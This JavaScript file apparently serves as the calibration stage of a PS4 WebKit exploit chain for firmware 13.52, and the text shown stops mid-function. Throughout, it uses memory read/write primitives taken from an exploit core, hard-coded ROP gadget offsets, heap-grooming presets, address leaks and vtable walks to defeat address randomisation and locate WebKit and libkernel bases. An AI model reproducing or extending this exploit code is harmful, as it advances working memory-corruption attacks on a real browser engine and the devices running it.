import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { createCrashLog } from "./log_persist.js";
import {
    collectLiveVtableExtPtrs,
    resolveLibkernelFromExtList,
    saveLibkernelSession,
    loadSessionOffsets,
    sessionBasesFromStorage,
    persistSessionBases,
    same64Ptr,
    formatExtPtrDiagLine,
} from "./libkernel_resolve.js";

const params = new URLSearchParams(location.search);
const lines = [];
let busy = false;
let ready = false;
let exploit = null;
let carrierRef = null;
let nativeFn = null;
let vtablePtr = null;
let vtableHit = null;
let tableOff = null;
let calibrated = null;
let manualBase = null;
let raceAttempt = 0;
let lengthMissStreak = 0;
let raceMode = false;
const raceBuf = [];
let walkQuiet = false;
const calRetain = [];

const LOG_MAX = 300;
const BUILD_ID = "cal-20250830i";
const WEBKIT_CODE_PROLOGUE = 0xe5894855;
const VTABLE_EXT_SLOTS = 48;
/** 2e lite — fewer vtable slot reads (OOM-safe on 13.52 HW) */
const VTABLE_EXT_SLOTS_LITE = parseInt(params.get("vtslots") || "20", 10);
/** Page probes during vtable score — 48 OOMs; lite uses 4 */
const VTABLE_WALK_PROBE = parseInt(params.get("vtprobe") || "4", 10);
/** ?full=1 or ?vtable=full — heavy chain scan (OOM risk) */
const VTABLE_2E_FULL = params.get("full") === "1" || params.get("vtable") === "full";
const crashLog = createCrashLog({
    ssLog: "wk-cal-log",
    ssState: "wk-cal-state",
    ssBuild: "wk-cal-log-build",
    buildId: BUILD_ID,
    maxLines: 200,
});
const CAL_ALIGN_STEP = 0x4000;
const ELF_MAGIC = 0x464c457f;
/** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
const ASSUMED_EXPM1 = parseInt(
    (params.get("expm1") || "eb6350").replace(/^0x/i, ""),
    16
);
/** 13.52 retail — HW-scanned pop gadgets (2025-08-27, inlined so stale ps4_offsets.js cannot regress) */
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
};

function merge1352Table(off) {
    if (!off) off = {};
    return Object.assign({}, off, HW_GADGETS_1352, { wk_expm1_builtin: ASSUMED_EXPM1 });
}
const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
/** WebKit maps can be ~40–50MB; 2048 pages (32MB) was too short on 13.52 */
const FIND_BASE_MAX_STEPS = parseInt(params.get("backmax") || "4096", 10);
const FIND_FWD_MAX_STEPS = parseInt(params.get("fwdmax") || "256", 10);
/** Chunked 2e walk — pages per button tap (OOM-safe) */
const VTABLE_WALK_CHUNK = parseInt(params.get("vtchunk") || "32", 10);
/** 0 = run full vtable walk as fast as possible; yield to UI every N steps */
const WALK_YIELD_EVERY = parseInt(params.get("walkyield") || "512", 10);
const WALK_LOG_EVERY = parseInt(params.get("walklog") || "1024", 10);
/** Manual 2e vtable walk — auto after Start OOMs on 13.52 (DOM churn during race). */
const AUTO_VTABLE_WALK = params.get("vtable") === "1"
    && !params.get("base") && !params.get("expm1");
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|CAL-|GADGET|ELF|BASES|LK-|PASTE|HINT-GROOM/i;
/** Chunked gadget scan — one tap = SCAN_CHUNK read8 steps (OOM-safe on PS4) */
const SCAN_GADGET_MIN = 0x10000;
const SCAN_GADGET_MAX = parseInt(params.get("scanmax") || "4800000", 16);
const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "20000", 16);
const SCAN_CHUNK = parseInt(params.get("scanchunk") || "2048", 10);

const GADGET_CHECKS = [
    ["POP_RDI", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_RAX", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["POP_R8", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["LEAVE", "wk_LEAVE_RET", [0xc9, 0xc3]],
];

const GROOM_PRESETS = {
    default: { g: [] },
    lite: { g: ["drain:256", "drainsz:32768", "slab:2097152"] },
    "384": { g: ["drain:384", "drainsz:32768", "slab:2097152"] },
    "512": { g: ["drain:512", "drainsz:32768", "slab:2097152"] },
    max: {
        g: [
            "drain:512", "drainsz:65536", "slab:4194304",
            "bfly:528384", "early:458752", "guard:589824",
            "pred:524288", "final:524288",
        ],
    },
};

function currentGroomKey() {
    const gs = params.getAll("g");
    if (gs.length === 0) return "default";
    for (const key of Object.keys(GROOM_PRESETS)) {
        if (key === "default") continue;
        const preset = GROOM_PRESETS[key];
        if (preset.g.length !== gs.length) continue;
        let match = true;
        for (let i = 0; i < preset.g.length; i++) {
            if (gs[i] !== preset.g[i]) { match = false; break; }
        }
        if (match) return key;
    }
    return "custom";
}

function groomBootLine() {
    const key = currentGroomKey();
    const gs = params.getAll("g");
    if (key === "custom") return "groom=custom (" + gs.join(", ") + ")";
    if (key === "default") return "groom=default (core 384 drain)";
    return "groom=" + key;
}

function reloadWithGroomPreset(key) {
    const preset = GROOM_PRESETS[key];
    if (!preset) return;
    const url = new URL(location.href);
    url.searchParams.delete("g");
    url.searchParams.delete("slots");
    for (let i = 0; i < preset.g.length; i++)
        url.searchParams.append("g", preset.g[i]);
    location.href = url.toString();
}

function wireGroomBar() {
    const key = currentGroomKey();
    const nodes = document.querySelectorAll("[data-groom]");
    for (let i = 0; i < nodes.length; i++) {
        const el = nodes[i];
        el.classList.toggle("active", el.getAttribute("data-groom") === key);
        el.addEventListener("click", function () {
            if (busy) return;
            const k = el.getAttribute("data-groom");
            if (k) reloadWithGroomPreset(k);
        });
    }
}

let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
let btnStart, btnLite, btnWide, btnVerify, btnScanGadgets, btnSetExpm1, btnSetBase, btnAssume, btnFindBase, btnFindBaseVtable, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
let calBarEl;
let scanMode = "lite";
let scanIndex = 0;
let scanList = [];
let verifyGadgetOk = 0;
let lastGadgetReport = "";

const SS_CANDIDATE = "wk-cal-candidate";
const SS_MANUAL_BASE = "wk-manual-base";
const SS_VSTEP = "wk-vstep";
const SS_VGAD_OK = "wk-vgad-ok";
const SS_LK_STEP = "wk-cal-lk-step";
const SS_LK_ERROR = "wk-cal-lk-errorFn";
const SS_LK_W0 = "wk-cal-lk-w0";
const SS_GSCAN = "wk-gscan-state";

function $(id) { return document.getElementById(id); }

function ptrNum(fn) {
    return (fn.hi >>> 0) * 0x100000000 + (fn.low >>> 0);
}

function ptrBigLocal(fn) {
    return (BigInt(fn.hi >>> 0) << 32n) | BigInt(fn.low >>> 0);
}

function ptrHexPad(fn) {
    if (!fn) return "";
    const s = ptrBigLocal(fn).toString(16);
    return s.length < 16 ? s.padStart(16, "0") : s;
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
    if (!raceMode || /OK|FAIL|error|native|primitive|promote|broken|cal/i.test(msg || ""))
        crashLog.persistState(msg, cls);
}

function setCalButton(el, on) {
    if (!el) return;
    el.disabled = !on;
    el.style.display = "inline-block";
    el.style.visibility = "visible";
}

function setUi() {
    const calReady = ready && nativeFn && !busy;
    if (btnStart) btnStart.disabled = busy || ready;
    setCalButton(btnLite, calReady);
    setCalButton(btnWide, calReady);
    setCalButton(btnVerify, calReady);
    setCalButton(btnScanGadgets, calReady && !!activeBase());
    setCalButton(btnSetExpm1, calReady);
    setCalButton(btnSetBase, calReady);
    setCalButton(btnAssume, calReady);
    setCalButton(btnVerify2, calReady);
    setCalButton(btnSetExpm12, calReady);
    setCalButton(btnSetBase2, calReady);
    setCalButton(btnProbe, calReady);
    setCalButton(btnFindBase, calReady);
    setCalButton(btnFindBaseVtable, ready && !busy);
    if (btnCopy) btnCopy.disabled = busy || !calibrated;
    if (expm1In) expm1In.disabled = busy || !(ready && nativeFn);
    if (baseIn) baseIn.disabled = busy || !(ready && nativeFn);
    if (calBarEl) {
        calBarEl.style.display = "flex";
        if (ready && nativeFn)
            calBarEl.style.borderColor = "#3a6b54";
    }
}

function preCalTrim() {
    if (lines.length > 4) {
        lines.splice(0, lines.length - 4);
        renderOut();
    }
    if (pinnedLines.length > 8)
        pinnedLines.splice(0, pinnedLines.length - 8);
}

async function yieldCal(ms) {
    preCalTrim();
    await new Promise(function (r) { setTimeout(r, ms != null ? ms : 64); });
    try {
        if (!exploit) {
            const core = await import("./core.js");
            exploit = { establishPrimitive: core.establishPrimitive, installWindowP,
                trimExploitDebris: core.trimExploitDebris };
        }
        if (exploit.trimExploitDebris)
            exploit.trimExploitDebris();
    } catch (_) { }
}

async function freeCalMemory() {
    calRetain.length = 0;
    carrierRef = null;
    lines.length = 0;
    pinnedLines.length = 0;
    renderOut();
    try {
        if (!exploit) {
            const core = await import("./core.js");
            exploit = { establishPrimitive: core.establishPrimitive, installWindowP,
                trimExploitDebris: core.trimExploitDebris };
        }
        if (exploit.trimExploitDebris)
            exploit.trimExploitDebris();
    } catch (_) { }
    await new Promise(r => setTimeout(r, 128));
}

function clearVerifyProgress() {
    verifyGadgetOk = 0;
    try {
        sessionStorage.removeItem(SS_VSTEP);
        sessionStorage.removeItem(SS_VGAD_OK);
        sessionStorage.removeItem(SS_LK_STEP);
        sessionStorage.removeItem(SS_LK_ERROR);
        sessionStorage.removeItem(SS_LK_W0);
    } catch (_) { }
}

function clearLkProgress() {
    try {
        sessionStorage.removeItem(SS_LK_STEP);
        sessionStorage.removeItem(SS_LK_ERROR);
        sessionStorage.removeItem(SS_LK_W0);
    } catch (_) { }
}

const SS_PROBE_I = "wk-cal-probe-i";
const SS_PROBE_LIST = "wk-cal-probe-n";
const SS_FIND_BASE_I = "wk-cal-findbase-i";
const SS_VTABLE_FIND_I = "wk-cal-vtable-find-i";
const SS_VTABLE_WALK = "wk-cal-vtable-walk";
const SS_VTABLE_PTR = "wk-vtablePtr";

const PIN_TAGS = /^WEBCORE|^CELL-SCAN|^TEXTAREA|^VTABLE|^MODULE-HIT|^CAL-ELF|^CAL-MODULE|^ELF-|^WALK-ANCHOR|^BOOT|^AUTO\b|^GADGET|^GADGET-REPORT/;
const pinnedLines = [];

function renderOut() {
    if (!outEl) return;
    const tailMax = 180;
    const tail = lines.length > tailMax ? lines.slice(-tailMax) : lines;
    outEl.textContent = (pinnedLines.length ? pinnedLines.join("\n") + "\n--- walk log ---\n" : "")
        + tail.join("\n");
    outEl.scrollTop = outEl.scrollHeight;
}

function clearPersistedLog() {
    crashLog.clear();
}

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    const raceCritical = /FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag);
    if (raceMode) {
        raceBuf.push(line);
        if (raceBuf.length > 64) raceBuf.shift();
        crashLog.append(line, tag);
        if (raceCritical) {
            lines.push(line);
            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
            if (outEl) {
                outEl.textContent = (pinnedLines.length ? pinnedLines.join("\n") + "\n--- walk log ---\n" : "")
                    + lines.join("\n");
                outEl.scrollTop = outEl.scrollHeight;
            }
        }
        return;
    }
    if (walkQuiet && !PIN_TAGS.test(tag) && !/^EXT-PTR|^VTABLE-OK|^VTABLE-FAIL|^WALK-|^MODULE-HIT/.test(tag)) {
        crashLog.append(line, tag);
        return;
    }
    if (PIN_TAGS.test(tag)) {
        pinnedLines.push(line);
        if (pinnedLines.length > 40) pinnedLines.splice(0, pinnedLines.length - 40);
    }
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    crashLog.append(line, tag);
    renderOut();
}

function markBlock(tag, lines) {
    const body = Array.isArray(lines) ? lines.join("\n") : String(lines);
    mark(tag, body);
}

function markGadgetReport(lines) {
    const body = lines.join("\n");
    lastGadgetReport = body;
    markBlock("GADGET-REPORT", lines);
    if (resultEl && ready) {
        const delta = activeDelta();
        const base = activeBase();
        resultEl.textContent = [
            "base=" + (base ? String(base) : "?"),
            delta > 0 ? "expm1=0x" + delta.toString(16) : "",
            body,
        ].filter(Boolean).join("\n");
    }
}

function ptrFromNum(n) {
    if (!(n >= 0)) return null;
    return new int64(n >>> 0, Math.floor(n / 0x100000000));
}

function ptrResidue(fn) {
    return ptrNum(fn) & (CAL_ALIGN_STEP - 1);
}

function baseFromDelta(fn, delta) {
    if (!fn || !(delta > 0)) return null;
    const n = ptrNum(fn) - delta;
    if (n <= 0) return null;
    return ptrFromNum(n);
}

function fmtMagic(m) {
    if (m == null) return "read-failed";
    return "0x" + (m >>> 0).toString(16);
}

function activeDelta() {
    const typed = parseExpm1(expm1In && expm1In.value);
    if (typed > 0) return typed;
    if (manualBase && nativeFn) {
        const d = ptrNum(nativeFn) - ptrNum(manualBase);
        if (d > 0) return d >>> 0;
    }
    try {
        const c = parseInt(sessionStorage.getItem(SS_CANDIDATE) || "0", 16);
        return c > 0 ? c : 0;
    } catch (_) { return 0; }
}

function activeBase() {
    if (manualBase) return manualBase;
    const delta = activeDelta();
    if (!nativeFn || !(delta > 0)) return null;
    return baseFromDelta(nativeFn, delta);
}

/** Offset table merged like index_rw loadEffectiveOff (calibrated + expm1 field). */
function loadEffectiveOffCal() {
    let off = Object.assign({}, tableOff || {});
    off = merge1352Table(off);
    off = loadSessionOffsets(off);
    const delta = activeDelta();
    if (delta > 0) off.wk_expm1_builtin = delta;
    return off;
}

/** Persist + derive webkitBase = nativeFn − expm1 (same path as index_rw). */
function syncBasesLikeRw() {
    if (nativeFn) persistSessionBases(nativeFn, null);
    const off = loadEffectiveOffCal();
    const bases = sessionBasesFromStorage(off, { nativeFn: nativeFn });
    let webkitBase = bases.webkitBase;
    if (bases.derived) {
        if (webkitBase && !same64Ptr(webkitBase, bases.derived))
            mark("BASE-SYNC", "webkitBase stale cached — using nativeFn-expm1 (index_rw)");
        webkitBase = bases.derived;
    }
    if (nativeFn && webkitBase) persistSessionBases(nativeFn, webkitBase);
    const expm1 = off.wk_expm1_builtin || 0;
    mark("BASE-SYNC", "webkit=" + (webkitBase || "—") + " expm1=0x" + expm1.toString(16));
    if (webkitBase && baseIn) baseIn.value = ptrNum(webkitBase).toString(16);
    updateResultPanel();
    return { off, webkitBase, nativeFn: nativeFn || bases.nativeFn };
}

function impliedExpm1FromBase(fn, base) {
    if (!fn || !base) return 0;
    const d = ptrNum(fn) - ptrNum(base);
    return d > 0 ? (d >>> 0) : 0;
}

function parseAddr(str) {
    if (!str) return null;
    let s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    // PS4 pointers are often 9–11 hex digits — pad so hi/lo split is correct
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read1p(p, addr) {
    if (!addr) return null;
    try { return p.read1(addr); } catch (_) { return null; }
}

function alignedWebkitBase(v) {
    return v && v.hi > 0 && (v.low & 0x3fff) === 0;
}

function liteHintDeltas(off, fn) {
    const hint = off.wk_expm1_builtin;
    if (hint == null) return [];
    const k = liteSpanK();
    const residue = ptrResidue(fn);
    const out = [];
    for (let i = -k; i <= k; i++) {
        const d = (hint + i * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue) out.push(d);
    }
    return out;
}

function probeAlignedDeltas(fn) {
    const minD = parseInt(params.get("min") || "0x1e00000", 16);
    const maxD = parseInt(params.get("max") || "0x2c00000", 16);
    const residue = ptrResidue(fn);
    const out = [];
    let d = (minD & ~(CAL_ALIGN_STEP - 1)) | residue;
    if (d < minD) d += CAL_ALIGN_STEP;
    while (d <= maxD) {
        out.push(d >>> 0);
        d += CAL_ALIGN_STEP;
    }
    return out;
}

function wideAlignedDeltas(fn) {
    return probeAlignedDeltas(fn);
}

function liteSpanK() {
    const fromUrl = parseInt(params.get("litek") || "", 10);
    if (fromUrl > 0) return fromUrl;
    return 8;
}

function isBadRead(magic) {
    return magic == null || BAD_READ_MAGICS.has(magic >>> 0);
}

function looksLikeNativeCode(magic) {
    if (isBadRead(magic)) return false;
    const b0 = magic & 0xff;
    const b1 = (magic >>> 8) & 0xff;
    if (b0 === 0x7f && b1 === 0x45) return false;
    return b0 === 0x55 || b0 === 0x48 || b0 === 0x41 || b0 === 0x89 || b0 === 0xe9;
}

function plausibleHeapPtr(ptr) {
    if (!ptr) return false;
    if (ptr.hi === 0 && ptr.low === 0) return false;
    if (ptr.hi === 0 && ptr.low < 0x10000) return false;
    return ptr.hi >= 0x1 && ptr.hi <= 0x12;
}

function plausibleModulePtr(ptr) {
    if (!ptr || ptr.hi === 0) return false;
    return ptr.hi >= 0x8 && ptr.hi <= 0x12;
}

function isMappedRead(p, addr) {
    return !isBadRead(read4p(p, addr));
}

function countWalkMappedPages(p, startPtr, maxProbe, backward) {
    let mapped = 0;
    const cap = maxProbe > 0 ? maxProbe : 0;
    for (let step = 0; step < cap; step++) {
        const page = walkPageFrom(startPtr, step, backward);
        if (!page) break;
        const probe = (step === 0) ? startPtr : page;
        if (isMappedRead(p, probe)) mapped++;
        else if (step === 0 && ptrNum(probe) !== ptrNum(page) && isMappedRead(p, page))
            mapped++;
    }
    return mapped;
}

function scoreVtableCandidate(p, vt, opts) {
    opts = opts || {};
    if (!plausibleModulePtr(vt)) return -1;
    let codeEntries = 0;
    for (let i = 0; i < 4; i++) {
        const fn = read8p(p, vt.add32(i * 8));
        if (!fn || !plausibleModulePtr(fn)) continue;
        if (looksLikeNativeCode(read4p(p, fn))) codeEntries++;
    }
    if (codeEntries < 2) return -1;
    if (!isMappedRead(p, vt)) return -1;
    if (opts.skipWalk) return codeEntries * 10 + 50;
    const maxProbe = opts.maxProbe != null ? opts.maxProbe : VTABLE_WALK_PROBE;
    const walkBack = countWalkMappedPages(p, vt, maxProbe, true);
    const walkFwd = countWalkMappedPages(p, vt, Math.min(maxProbe, 8), false);
    if (walkBack < 2 && walkFwd < 1) return -1;
    return codeEntries * 10 + walkBack + walkFwd;
}

function tryWebcoreVtable(p, path, webcore, implOff, vtOff, labelExtra, opts) {
    opts = opts || {};
    const quiet = !!opts.quiet;
    if (!quiet) {
        mark("WEBCORE-TRY", path.label + (labelExtra || "") + " impl+0x"
            + implOff.toString(16) + " webcore="
            + (webcore ? String(webcore) : "null"));
    }
    if (!webcore) return null;

    const vt = read8p(p, webcore.add32(vtOff));
    const e0 = vt ? read4p(p, vt) : null;
    if (!quiet) {
        mark("WEBCORE-TRY", path.label + " vt+0x" + vtOff.toString(16) + " vtable="
            + (vt ? String(vt) : "read-fail") + " entry0=" + fmtMagic(e0));
    }

    if (!vt || !plausibleModulePtr(vt)) return null;
    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;

    const score = scoreVtableCandidate(p, vt, opts);
    if (score < 0 && !(implOff === 0x18 && vtOff === 0)) return null;

    return {
        label: path.label + (labelExtra || ""),
        cell: path.cell,
        implOff,
        vtOff,
        webcore,
        vtable: vt,
        entry0: read8p(p, vt),
        score: score >= 0 ? score : 50,
        walkBack: opts.skipWalk ? 0 : countWalkMappedPages(p, vt, opts.maxProbe || VTABLE_WALK_PROBE, true),
    };
}

function collectTextareaCells(p, carrier, opts) {
    opts = opts || {};
    const cells = [];
    const seen = new Set();
    const add = (label, cell) => {
        if (!cell || cell.hi === 0) return;
        const k = ptrNum(cell);
        if (seen.has(k)) return;
        seen.add(k);
        cells.push({ label, cell });
    };

    if (carrier && carrier.textarea) {
        try {
            add("leakval(carrier.textarea)", p.leakval(carrier.textarea));
        } catch (err) {
            mark("VTABLE-WARN", "leakval(carrier.textarea): " + err.message);
        }
    }
    if (carrier && carrier.textareaAddress > 0 && Number.isFinite(carrier.textareaAddress)) {
        add("carrier.textareaAddress", addrFromNumber(carrier.textareaAddress));
    }
    if (!opts.noFresh) {
        try {
            const fresh = document.createElement("textarea");
            calRetain.push(fresh);
            add("leakval(fresh.textarea)", p.leakval(fresh));
        } catch (err) {
            mark("VTABLE-WARN", "leakval(fresh.textarea): " + err.message);
        }
    }

    if (!opts.quiet) {
        if (cells.length >= 2) {
            mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell
                + " | " + cells[1].label + "=" + cells[1].cell);
        } else if (cells.length === 1) {
            mark("TEXTAREA-CELL", cells[0].label + "=" + cells[0].cell);
        }
    }
    return cells;
}

function logCellSlots(p, cell, label) {
    let parts = label + " cell=" + cell;
    for (let off = 0; off <= 0x40; off += 8) {
        const q = read8p(p, cell.add32(off));
        if (!q || q.hi === 0) continue;
        parts += " +0x" + off.toString(16) + "=" + q;
    }
    mark("CELL-SCAN", parts);
}

function pushVtableHit(hits, seen, hit) {
    const k = ptrNum(hit.vtable);
    if (seen.has(k)) return;
    seen.add(k);
    hits.push(hit);
}

function discoverTextareaVtableChainsLite(p, carrier) {
    const vtOpts = { skipWalk: true, quiet: true, maxProbe: 0 };
    const cells = collectTextareaCells(p, carrier, { noFresh: true, quiet: true });
    if (!cells.length) {
        mark("VTABLE-FAIL", "no textarea JSObject — re-run Start");
        return [];
    }

    const hits = [];
    const seen = new Set();
    const path = cells[0];

    const psfree = probePsFreeTextareaChainQuiet(p, path.cell, path.label);
    if (psfree) {
        psfree.walkBack = 0;
        pushVtableHit(hits, seen, psfree);
        mark("VTABLE-OK", psfree.label + " vtable=" + psfree.vtable + " (lite/psfree)");
        return hits;
    }

    for (let ii = 0; ii < 2; ii++) {
        const implOff = ii === 0 ? 0x18 : 0x8;
        const webcore = read8p(p, path.cell.add32(implOff));
        if (!webcore) continue;
        const hit = tryWebcoreVtable(p, path, webcore, implOff, 0, "", vtOpts);
        if (hit) pushVtableHit(hits, seen, hit);
    }

    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
    if (hits.length) {
        mark("VTABLE-OK", hits[0].label + " vtable=" + hits[0].vtable + " (lite)");
    } else {
        mark("VTABLE-FAIL", "lite miss — try ?full=1 (OOM risk) or ?g=512 groom");
    }
    return hits;
}

function discoverTextareaVtableChains(p, carrier, opts) {
    opts = opts || {};
    if (opts.lite !== false && !VTABLE_2E_FULL)
        return discoverTextareaVtableChainsLite(p, carrier);

    const walkOpts = { maxProbe: VTABLE_WALK_PROBE };
    const cells = collectTextareaCells(p, carrier);
    if (cells.length === 0) {
        mark("VTABLE-FAIL", "no textarea JSObject — re-run Start");
        return [];
    }

    if (!walkQuiet) {
        for (let ci = 0; ci < cells.length; ci++)
            logCellSlots(p, cells[ci].cell, cells[ci].label);
    }

    const hits = [];
    const seen = new Set();

    for (let ci = 0; ci < cells.length; ci++) {
        const path = cells[ci];
        const psfree = probePsFreeTextareaChain(p, path.cell, path.label);
        if (psfree) {
            psfree.walkBack = countWalkMappedPages(p, psfree.vtable, VTABLE_WALK_PROBE, true);
            mark("VTABLE-CAND", "PSFree chain vtable=" + psfree.vtable
                + " walkBack=" + psfree.walkBack);
            pushVtableHit(hits, seen, psfree);
        }

        for (let implOff = 0x8; implOff <= 0x58; implOff += 8) {
            if (implOff === 0x18 && psfree) continue;
            const webcore = read8p(p, path.cell.add32(implOff));
            if (!webcore) continue;
            for (let vtOff = 0; vtOff <= 0x10; vtOff += 8) {
                const hit = tryWebcoreVtable(p, path, webcore, implOff, vtOff, "", walkOpts);
                if (!hit) continue;
                mark("VTABLE-CAND", hit.label + " vtable=" + hit.vtable + " score=" + hit.score);
                pushVtableHit(hits, seen, hit);
            }
        }

        const bfly = read8p(p, path.cell.add32(0x8));
        if (!bfly || !plausibleHeapPtr(bfly)) continue;
        for (let slot = 0; slot < 16; slot++) {
            const webcore = read8p(p, bfly.add32(slot * 8));
            const hit = tryWebcoreVtable(p, path, webcore, 0x8, 0, "/bfly" + slot, walkOpts);
            if (!hit) continue;
            mark("VTABLE-CAND", hit.label + " webcore=" + webcore
                + " vtable=" + hit.vtable + " score=" + hit.score);
            pushVtableHit(hits, seen, hit);
        }
    }

    hits.sort((a, b) => b.score - a.score);
    if (hits.length > 0) {
        const best = hits[0];
        mark("VTABLE-OK", best.label + " impl+0x" + best.implOff.toString(16)
            + " vtable=" + best.vtable + " score=" + best.score
            + " walkBack=" + best.walkBack);
    } else {
        mark("VTABLE-FAIL", "no WebCore/vtable passed validation — see CELL-SCAN");
        mark("HINT", "need impl+0x18=m_wrapped (PSFree); paste CELL-SCAN lines");
    }
    return hits;
}

function captureNativeFn(p, off) {
    const mOff = off.wk_JSFunction_m_function || 0x28;
    const cell = p.leakval(Math.expm1);
    mark("CAL-CELL", String(cell));
    const paths = [];

    const mid = read8p(p, cell.add32(0x18));
    if (mid) {
        for (const o of [mOff, 0x20, 0x28, 0x30, 0x38, 0x8, 0x10, 0x0]) {
            const fn = read8p(p, mid.add32(o));
            if (fn && fn.hi > 0)
                paths.push({ label: "cell+0x18 -> +0x" + o.toString(16), fn });
        }
    }
    for (let o = 0x8; o <= 0x30; o += 8) {
        const q = read8p(p, cell.add32(o));
        if (q && q.hi > 0)
            paths.push({ label: "cell+0x" + o.toString(16), fn: q });
    }

    let fallback = null;
    for (let i = 0; i < paths.length; i++) {
        const path = paths[i];
        const code = read4p(p, path.fn);
        mark("CAL-PATH-TRY", path.label + " fn=" + path.fn + " code=" + fmtMagic(code));
        if (looksLikeNativeCode(code)) {
            mark("CAL-NATIVEFN-PATH", path.label);
            mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code));
            try { sessionStorage.setItem("wk-nativeFn", String(path.fn)); } catch (_) { }
            return path.fn;
        }
        if (!isBadRead(code) && !fallback)
            fallback = path.fn;
    }

    if (fallback) {
        mark("CAL-WARN", "nativeFn using weak fallback " + fallback);
        try { sessionStorage.setItem("wk-nativeFn", String(fallback)); } catch (_) { }
        return fallback;
    }

    if (paths.length > 0 && paths[0].fn) {
        mark("CAL-WARN", "no path looked like code — using first path");
        return paths[0].fn;
    }
    return null;
}

function findBaseWalkAddr(fn, step) {
    return walkPageFrom(fn, step, true);
}

function walkPageFrom(startPtr, step, backward) {
    const page = ptrNum(startPtr) & ~(CAL_ALIGN_STEP - 1);
    const addrNum = backward
        ? page - step * CAL_ALIGN_STEP
        : page + step * CAL_ALIGN_STEP;
    if (addrNum <= 0x100000) return null;
    if (addrNum >= 0xffffffff000) return null;
    return ptrFromNum(addrNum);
}

function checkPsFreeTextMagic(p, base) {
    const q0 = read8p(p, base);
    const q1 = read8p(p, base.add32(8));
    if (!q0 || !q1) return false;
    return q0.low === 0xe5894855 && q0.hi === 0x56415741
        && q1.low === 0x54415541 && q1.hi === 0x8d485053;
}

function checkPsFreeDataMagic(p, base) {
    const q0 = read8p(p, base);
    const q1 = read8p(p, base.add32(8));
    if (!q0 || !q1) return false;
    return q0.low === 0x20 && q0.hi === 0
        && q1.low === 0x3c13f4bf && q1.hi === 0x2;
}

function classifyModulePage(p, base) {
    const w0 = read4p(p, base);
    if (w0 === ELF_MAGIC) return "elf";
    if (w0 === 0xe5894855) return "text";
    if (checkPsFreeTextMagic(p, base)) return "text";
    if (checkPsFreeDataMagic(p, base)) return "data";
    return null;
}

function probePsFreeTextareaChainQuiet(p, cell, label) {
    const webcore = read8p(p, cell.add32(0x18));
    if (!webcore) return null;
    const vt0 = read8p(p, webcore);
    const e0 = vt0 ? read4p(p, vt0) : null;
    if (!vt0 || !plausibleModulePtr(vt0)) return null;
    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;
    return {
        label: label + "/psfree+0x18",
        cell,
        implOff: 0x18,
        vtOff: 0,
        webcore,
        vtable: vt0,
        entry0: read8p(p, vt0),
        score: 100,
    };
}

function discoverTextareaVtableLite(p, carrier) {
    const cells = collectTextareaCells(p, carrier);
    if (!cells.length) return [];
    const hits = [];
    const psfree = probePsFreeTextareaChainQuiet(p, cells[0].cell, cells[0].label);
    if (psfree) hits.push(psfree);
    return hits;
}

function isWebkitExtCode(code) {
    return code != null && (code >>> 0) === WEBKIT_CODE_PROLOGUE;
}

function ptrLooksWebkitInterior(fnPtr, webkitBase) {
    if (!fnPtr || !webkitBase || fnPtr.hi !== webkitBase.hi) return false;
    const lo = webkitBase.low >>> 0;
    const fl = fnPtr.low >>> 0;
    if (fl < lo) return false;
    return (fl - lo) < 0x1500000;
}

/** All vtable chains → external fn ptrs (skips webkit interior). */
async function collectExtPtrsFromVtableHits(p, hits, webkitBase, opts) {
    opts = opts || {};
    const slots = opts.slots != null ? opts.slots : VTABLE_EXT_SLOTS;
    const yieldEvery = opts.yieldEvery != null ? opts.yieldEvery : 0;
    const out = [];
    const seen = new Set();
    for (let hi = 0; hi < hits.length; hi++) {
